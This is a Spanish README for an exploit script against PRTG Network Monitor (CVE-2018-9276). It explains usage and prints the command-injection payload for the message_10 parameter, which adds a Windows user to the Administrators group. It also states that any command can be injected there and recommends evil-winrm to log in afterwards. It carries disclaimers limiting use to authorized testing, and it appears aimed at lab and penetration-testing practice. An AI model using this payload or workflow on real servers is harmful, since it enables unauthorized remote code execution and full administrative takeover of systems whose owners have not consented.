
```markdown
# PRTG Exploit Script

Este script está diseñado para explotar una vulnerabilidad CVE-2018-9276 en PRTG Network Monitor, permitiendo añadir un usuario al sistema y asignarle privilegios de administrador. **Este script es para fines educativos y de prueba de penetración autorizada únicamente. No lo utilices en sistemas sin permiso explícito.**

## Requisitos

- Python 3.x
- Librería `requests` (puede instalarse con `pip install requests`)

## Uso



### Clonar el repositorio

```bash
git clone https://github.com/tu_usuario/tu_repositorio.git
cd tu_repositorio
```

### Ejecución del script

El script se ejecuta desde la línea de comandos y requiere algunos argumentos:

```bash
python exploit_prtg.py -u http://10.10.10.152 --user nuevo_usuario --password "Password123!"
```

### Argumentos

- `-u` o `--url`: La URL base del servidor PRTG (por ejemplo, `http://10.10.10.152`).
- `--user`: El nombre de usuario que se desea añadir al sistema.
- `--password`: La contraseña del usuario que se añadirá. Es recomendable que la contraseña tenga más de 9 caracteres, incluyendo mayúsculas, números y caracteres especiales.

### Ejemplo

```bash
python exploit_prtg.py -u http://10.10.10.152 --user eviluserrrr --password "EvilUser1234!"
```

### Notas Importantes

- **Nombre de usuario:** PRTG puede requerir que el nombre de usuario tenga al menos 9 caracteres.
- **Contraseña:** Asegúrate de que la contraseña cumple con las políticas de complejidad (mayúsculas, números y caracteres especiales).

### Vulnerabilidad y Ejecución Remota de Código (RCE)

Este script explota una vulnerabilidad en la línea `message_10` del cuerpo de la solicitud POST. La vulnerabilidad permite la ejecución remota de comandos debido a que en esta línea puedes inyectar comandos arbitrarios después del texto `test.txt;`. Por ejemplo, el script añade un nuevo usuario y lo agrega al grupo de administradores en PRTG.

#### Ejemplo de Inyección

En el parámetro `message_10`, el script actual realiza lo siguiente:

```plaintext
test.txt;net user {args.user} {args.password} /add;net localgroup Administrators {args.user} /add
```

Puedes modificar esta línea para ejecutar otros comandos arbitrarios según sea necesario.

### Consejos

Para obtener acceso al sistema, se recomienda usar `evil-winrm` una vez que el usuario haya sido agregado al grupo de administradores.

```bash
evil-winrm -i 10.10.10.152 -u eviluserrrr -p "EvilUser1234!"
```
![Evil-WinRM](image.png)

### Advertencia

Este script y la información aquí proporcionada son solo para propósitos educativos y de pruebas de seguridad en entornos controlados y con permiso explícito. **No lo uses en sistemas para los que no tienes autorización, ya que hacerlo podría ser ilegal.**

## Autor

[Cocok]
Pero gracias a https://codewtch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/ por la información sobre la vulnerabilidad.

Este `README.md` ahora explica claramente la vulnerabilidad de ejecución remota de código (RCE) y cómo la línea `message_10` puede ser utilizada para ejecutar comandos arbitrarios. También se incluyen ejemplos sobre cómo usar el script y cómo aprovechar la vulnerabilidad para obtener acceso al sistema.